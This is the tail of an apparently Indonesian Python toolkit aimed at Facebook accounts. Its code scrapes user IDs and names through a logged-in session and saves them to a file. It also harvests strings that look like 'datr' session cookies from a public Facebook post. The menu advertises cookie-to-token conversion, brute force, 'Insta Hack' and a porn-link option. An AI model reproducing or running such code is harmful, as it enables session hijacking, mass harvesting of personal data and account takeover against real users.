			link = self.ses.get(url, headers={"Host": "mbasic.facebook.com", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "cache-control": "max-age=0", "sec-ch-ua": '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="106"', "sec-ch-ua-mobile": "?0", "sec-ch-ua-model": "", "ch-ua-platform": '"Android"', "sec-fetch-dest": "document", "sec-fetch-mode": "navigate", "sec-fetch-site": "none", "sec-fetch-user": "?1", "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36 OPR/72.4.3767.69265", "cookie": self.cok["cookie"]}).text
			data = re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',link)
			for user in data:
				if "profile.php?" in user[0]:
					mentah = re.findall("id\=(.*?)\&",user[0])[0]+"|"+user[1]
					open(f"/sdcard/{self.file}.txt","a").write(str(mentah)+"\n")
					xxx = open(f"/sdcard/{self.file}.txt","r").read().splitlines()
					print(f'\r࿐ {len(xxx)} - %s        '%(user[1]),end=" ")
				else:
					mentah = re.findall("\/(.*?)\?eav",user[0])[0]+"|"+user[1]
					open(f"/sdcard/{self.file}.txt","a").write(str(mentah)+"\n")
					xxx = open(f"/sdcard/{self.file}.txt","r").read().splitlines()
					print(f'\r࿐ {len(xxx)} - %s        '%(user[1]),end=" ")
				sys.stdout.flush()
			if "Lihat Teman Lain" in link:
				self.dump_publik("https://mbasic.facebook.com"+parser(link, "html.parser").find("a", string="Lihat Teman Lain").get("href"))
		except Exception as e: print(e)

def cookies():
    try:
        ses=requests.Session()
        n,cok,cookie=0,[],[]
        url = parser(ses.get("https://mbasic.facebook.com/100032386028880/posts/674525870303608/?app=fbl").text,"html.parser")
        #url = parser(ses.get("https://mbasic.facebook.com/photo.php?fbid=549345863862686&id=100063618310179&set=a.309477517849523&eav=AfYWXx6P3rikaNUKhUa1aQI9HyITaH3Xto98Ht2qYSzRPDwLVjTXOzNUb9cgdlmzEMo&paipv=0&p=0&av=100009469942335&refid=13").text,"html.parser")
        for z in url("span"):
            cok.append(z.text)
        for x in "".join(cok).split("datr"):
                cok = f"datr{x}"
                if cok in cookie:
                    pass
                else:
                    if "Beranda" in cok:
                        pass
                    else:
                        n+=1
                        print()
                        cookie.append(cok)
                        print(f"{n}.{h} {cok}{p}\n")
    except:pass

def ua_kamu():
    try:
        os.system("xdg-open http://whatsmyuseragent.org/");exit()
    except:pass

update();clear();logo()
print(f' 1. Cookies Facebook   {k}Maintance{p}')
print(f' 2. Dump Id RegEx')
print(f" 3. Cek Aplikasi Terkait")
print(f" 4. Convert Cookie Ke Semua Token")
print(f'{u} └── Other Tools{p} ☂')
print(f"     5. Bokep Link :v ")
print(f"     6. Chekpoint Detector  {k}Maintance{p} ")
print(f'     7. Lite Qur an   {h}Stay Halal Bro {p}')
print(f'     8. Cek User Agent & IP Kamu')
print(f'{u}     └── Special Tools{p} ☂')
print(f"         9. Multi Brute Force   {bru}Coming Soon!{p}")
print(f"         10. Insta Hack   {bru}Coming Soon!{p}\n")
print(f' 0. Kontak Admin')
print()
tian = input(f' {m}Pi{k}li{h}h {m}︻{k}芫{h}═── {p}')


if tian in ('1'): 
    print("\n Tunggu Sebentar!");time.sleep(2);cookies()
if tian == ('2'):
	print(f'\n  Tunggu Sebentar ۝ঔৣ✞ ');time.sleep(2)
	Dump_regex().menu()
if tian == ('3'):
    cek_apk()
if tian == ('4'):
    if __name__ =='__main__':clear();logo();input_cookie()
if tian == ('5'): 
    Bokep().__menu__()
if tian == ('6'):
	if __name__=='__main__':clear();menu()
if tian == ('7'):
    ScrapeSurah().Menu()
if tian == ('8'):
    print(f'  Anda Akan Di Arahkan Ke Browser');time.sleep(2)
    ua_kamu()
if tian == ('9'): 
    print(f'\nSorry, Sedang Maintance!\n')
if tian == ('10'): 
    print(f'\nSorry, Sedang Maintance!\n')
exit()
if tian == ('0'): 
    print(f'\n Admin Sedang Tidur!\n')